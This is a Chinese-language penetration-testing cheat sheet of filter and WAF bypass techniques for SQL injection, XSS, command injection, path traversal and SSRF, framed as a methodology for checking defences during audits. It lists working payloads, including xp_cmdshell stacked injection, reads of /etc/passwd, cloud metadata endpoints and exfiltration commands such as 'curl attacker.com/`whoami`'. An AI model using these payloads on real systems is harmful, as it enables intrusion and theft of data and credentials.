# 绕过策略方法论 (Bypass Strategies)

> 从先知社区安全研究提炼的系统性绕过思维，用于验证防护措施的有效性
> 核心原则：发现防护不等于安全，必须验证防护的完整性和可绕过性

---

## 核心思维模型

### 绕过的本质

```
绕过 = 语义差异利用 + 边界条件探索 + 防护盲区发现

三个关键问题:
1. 防护组件和目标组件的解析是否一致？（语义差异）
2. 防护是否覆盖所有边界情况？（Corner Case）
3. 防护是否覆盖所有输入路径？（盲区）
```

### 通用绕过决策树

```
发现防护措施
    │
    ├─→ 分析防护类型
    │       ├─ 黑名单过滤 → 寻找遗漏项、编码绕过、同义替换
    │       ├─ 白名单过滤 → 寻找白名单内的危险用法
    │       ├─ 输入验证   → 寻找验证逻辑缺陷、类型混淆
    │       └─ 输出编码   → 寻找编码不一致、上下文逃逸
    │
    ├─→ 分析防护位置
    │       ├─ WAF/反代层 → 利用与后端的解析差异
    │       ├─ 应用层     → 寻找绕过该层的其他入口
    │       └─ 框架层     → 寻找框架特性或配置缺陷
    │
    └─→ 分析防护完整性
            ├─ 是否覆盖所有参数？
            ├─ 是否覆盖所有HTTP方法？
            ├─ 是否覆盖所有Content-Type？
            └─ 是否覆盖所有编码方式？
```

---

## SQL注入绕过策略树

### 关键字过滤绕过

```
                    ┌─ 大小写混写: UnIoN SeLeCt
                    ├─ 双写绕过: uniunionon selselectect
         关键字过滤 ─┼─ 编码绕过: hex/char()/unhex()
                    ├─ 注释插入: un/**/ion sel/**/ect
                    ├─ 同义替换: || 代替 or, && 代替 and
                    └─ 科学计数法: 1e0union / 1.0union
```

### 空格过滤绕过

```
                    ┌─ 注释符: select/**/user/**/from
                    ├─ 括号嵌套: select(user)from(dual)
         空格过滤 ──┼─ 换行符: %0a %0d %09 %0b %0c
                    ├─ 反引号(MySQL): `select`user`from`
                    └─ 加号(URL): select+user+from
```

### 引号过滤绕过

```
                    ┌─ 十六进制: 0x61646D696E (admin)
                    ├─ char()函数: char(97,100,109,105,110)
         引号过滤 ──┼─ 宽字节注入: %df%27 (GBK环境)
                    ├─ 反斜杠逃逸: admin\' and password=\'
                    └─ 数值型注入: 不需要引号闭合
```

### 逗号过滤绕过

```
                    ┌─ from...for: substr(user from 1 for 1)
                    ├─ offset: limit 1 offset 2
         逗号过滤 ──┼─ join语法: select * from (select 1)a join (select 2)b
                    └─ case when: case when 1=1 then 1 else 2 end
```

### 函数过滤绕过

```
                    ┌─ 等价函数: mid() ↔ substr() ↔ substring()
                    │           ascii() ↔ ord()
                    │           sleep() ↔ benchmark()
         函数过滤 ──┼─ 字符串拼接: concat() ↔ concat_ws() ↔ group_concat()
                    ├─ 条件判断: if() ↔ case when ↔ ifnull() ↔ nullif()
                    └─ 时间延迟: sleep() ↔ benchmark() ↔ get_lock()
```

### 数据库特定绕过

```
MySQL:
- /*!50000select*/ 版本注释
- {x select} 花括号语法
- @`'` 变量名特殊字符

MSSQL:
- 堆叠注入: ; exec xp_cmdshell 'cmd'
- 方括号: [select]
- 变量赋值: declare @a nvarchar(100); set @a='cmd'; exec(@a)

Oracle:
- 双管道拼接: 'a'||'b'
- DBMS_PIPE.RECEIVE_MESSAGE 延时
- UTL_HTTP.REQUEST SSRF

PostgreSQL:
- $$string$$ 美元符引用
- ::text 类型转换
- pg_sleep() 延时
```

---

## XSS绕过策略树

### 标签过滤绕过

```
                    ┌─ 大小写: <ScRiPt>
                    ├─ 闭合变体: <script > <script/> <script	>
         标签过滤 ──┼─ 事件属性: <img onerror=alert(1)>
                    ├─ 伪协议: <a href="javascript:alert(1)">
                    └─ 特殊标签: <svg>, <math>, <details>, <marquee>
```

### 事件过滤绕过

```
                    ┌─ 常见事件: onerror, onload, onclick, onmouseover
                    ├─ 冷门事件: onfocus, onblur, oninput, onchange
         事件过滤 ──┼─ 动画事件: onanimationend, ontransitionend
                    ├─ 媒体事件: oncanplay, ondurationchange
                    └─ 新HTML5事件: onpointerenter, ontouchstart
```

### JavaScript关键字绕过

```
                    ┌─ 编码: \u0061lert (Unicode)
                    ├─ 拼接: eval('al'+'ert(1)')
       关键字过滤 ──┼─ 函数构造: Function('alert(1)')()
                    ├─ 模板字符串: `${alert(1)}`
                    └─ with语句: with(document)body.innerHTML='x'
```

### 括号过滤绕过

```
                    ┌─ 模板字符串: alert`1`
                    ├─ throw语句: throw onerror=alert,1
         括号过滤 ──┼─ location赋值: location='javascript:alert(1)'
                    ├─ 异常处理: onerror=alert;throw 1
                    └─ setter/getter: Object.defineProperty
```

### 编码层面绕过

```
                    ┌─ HTML实体: &#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;
                    ├─ Unicode: \u006a\u0061\u0076\u0061
         编码绕过 ──┼─ URL编码: %6A%61%76%61%73%63%72%69%70%74
                    ├─ Base64: atob('YWxlcnQoMSk=')
                    └─ 八进制/十六进制: \x6a\x61\x76\x61
```

---

## 命令注入绕过策略树

### 命令分隔符

```
Unix/Linux:
; | || && & ` $() %0a %0d \n

Windows:
& | && || %0a

通用:
换行符 (%0a, %0d, \n, \r)
```

### 空格绕过

```
                    ┌─ ${IFS}: cat${IFS}file
                    ├─ $IFS$9: cat$IFS$9file
         空格绕过 ──┼─ 制表符: cat%09file
                    ├─ 花括号: {cat,file}
                    └─ 重定向: cat<file
```

### 关键字绕过

```
                    ┌─ 引号插入: c'a't file, c"a"t file
                    ├─ 反斜杠: c\at file
         命令绕过 ──┼─ 变量拼接: a=c;b=at;$a$b file
                    ├─ 通配符: /bin/c?t file, /bin/c[a]t file
                    └─ Base64: echo Y2F0IGZpbGU= | base64 -d | sh
```

### 外带数据

```
                    ┌─ DNS外带: ping `whoami`.attacker.com
                    ├─ HTTP外带: curl attacker.com/`whoami`
         数据外带 ──┼─ 文件写入: whoami > /var/www/html/out.txt
                    └─ 时间盲注: if [ `id -u` -eq 0 ]; then sleep 5; fi
```

---

## 路径遍历绕过策略树

### 基础绕过

```
                    ┌─ URL编码: %2e%2e%2f (%2e = ., %2f = /)
                    ├─ 双重编码: %252e%252e%252f
         编码绕过 ──┼─ Unicode: ..%c0%af, ..%c1%9c (IIS)
                    ├─ 16位Unicode: %u002e%u002e%u2215
                    └─ 混合编码: ..%255c (双重+URL)
```

### 路径规范化绕过

```
                    ┌─ 冗余路径: /etc/passwd/./././
                    ├─ 双斜杠: //etc//passwd
         规范化绕过─┼─ 点点斜杠变体: ....// , ..../
                    ├─ 反斜杠混用: ..\..\etc\passwd
                    └─ 空字节截断: ../../../etc/passwd%00.jpg (旧版本)
```

### 过滤逻辑绕过

```
                    ┌─ 双写: ....// (过滤../ 后剩余../)
                    ├─ 绝对路径: /etc/passwd (不使用../)
         逻辑绕过 ──┼─ 符号链接: 上传包含符号链接的压缩包
                    └─ 文件协议: file:///etc/passwd
```

---

## SSRF绕过策略树

### IP地址表示绕过

```
                    ┌─ 十进制: http://2130706433 (127.0.0.1)
                    ├─ 八进制: http://0177.0.0.1
         IP表示绕过─┼─ 十六进制: http://0x7f.0x0.0x0.0x1
                    ├─ 混合格式: http://127.1, http://127.0.1
                    └─ IPv6: http://[::1], http://[::ffff:127.0.0.1]
```

### 域名绕过

```
                    ┌─ DNS Rebinding: 第一次解析公网IP，第二次解析内网IP
                    ├─ 短域名服务: http://127.0.0.1.nip.io
         域名绕过 ──┼─ 子域名欺骗: http://evil.com#@internal.server
                    ├─ URL解析差异: http://evil.com\@internal.server
                    └─ IDN同形异义: 使用相似Unicode字符
```

### 协议绕过

```
                    ┌─ file://: file:///etc/passwd
                    ├─ gopher://: gopher://127.0.0.1:6379/_*1%0d%0a...
         协议绕过 ──┼─ dict://: dict://127.0.0.1:6379/info
                    ├─ tftp://: tftp://attacker.com/file
                    └─ 重定向: 外网URL 302 跳转到内网
```

### 云环境特定

```
AWS:
- http://169.254.169.254/latest/meta-data/
- http://instance-data/latest/meta-data/

GCP:
- http://metadata.google.internal/computeMetadata/v1/
- 需要Header: Metadata-Flavor: Google

Azure:
- http://169.254.169.254/metadata/instance?api-version=2021-02-01
- 需要Header: Metadata: true

阿里云:
- http://100.100.100.200/latest/meta-data/
```

---

## WAF通用绕过思路

### 协议层面

```
1. 分块传输编码 (Chunked Encoding)
   Transfer-Encoding: chunked

2. HTTP参数污染 (HPP)
   ?id=1&id=2' OR 1=1--

3. Content-Type混淆
   multipart/form-data 边界混淆

4. HTTP方法覆盖
   X-HTTP-Method-Override: PUT

5. HTTP/2特性
   伪Header、大小写敏感差异
```

### 编码层面

```
1. 多重编码
   URL → HTML Entity → Unicode

2. 字符集差异
   GBK宽字节、UTF-7、UTF-16

3. 压缩传输
   Content-Encoding: gzip
```

### 逻辑层面

```
1. 超长参数
   超过WAF检测长度限制

2. 多参数组合
   分散payload到多个参数

3. 延迟触发
   存储型XSS、二次注入

4. 冷门入口
   HTTP Header、Cookie、Referer
```

---

## Corner Case 思维清单

### 编码Corner Case

- [ ] 双重URL编码
- [ ] Unicode变体 (%u0027)
- [ ] 宽字节 (GBK环境 %df%27)
- [ ] Overlong UTF-8 (%c0%ae = .)
- [ ] 混合编码 (部分编码部分不编码)

### 语法Corner Case

- [ ] 注释嵌套 `/*!50000select*/`
- [ ] 科学计数法 `1e0union`
- [ ] 浮点数 `1.0union`
- [ ] 负数 `-1 union select`
- [ ] 空白字符变体 (\t, \n, \r, \f, \v)

### 协议Corner Case

- [ ] HTTP参数污染
- [ ] 分块传输编码
- [ ] Content-Type边界混淆
- [ ] HTTP方法覆盖
- [ ] Host头注入

### 解析差异Corner Case

- [ ] 正则回溯攻击 (ReDoS)
- [ ] JSON键重复 (使用后者还是前者?)
- [ ] XML DTD处理差异
- [ ] 路径规范化差异 (Windows vs Linux)

---

## 使用指南

### 审计流程中的应用

```
1. 发现防护措施后，不要直接跳过
2. 根据防护类型，查阅对应绕过策略树
3. 依次尝试各种绕过技术
4. 记录成功或失败的绕过尝试
5. 如果所有尝试失败，标注[防护有效]
6. 如果发现绕过方法，标注[可绕过]并记录方法
```

### 报告格式

```markdown
## 防护分析: [防护名称]

### 防护类型
- 类型: 黑名单/白名单/输入验证/输出编码
- 位置: WAF/应用层/框架层
- 覆盖范围: 全局/部分接口

### 绕过尝试
| 技术 | Payload | 结果 |
|------|---------|------|
| 大小写 | UnIoN | 失败 |
| 注释插入 | un/**/ion | 成功 |

### 结论
[可绕过] 通过注释插入可以绕过关键字过滤
```

---

**版本**: 1.0
**来源**: 先知社区安全研究方法论提炼
**更新日期**: 2026-02-02
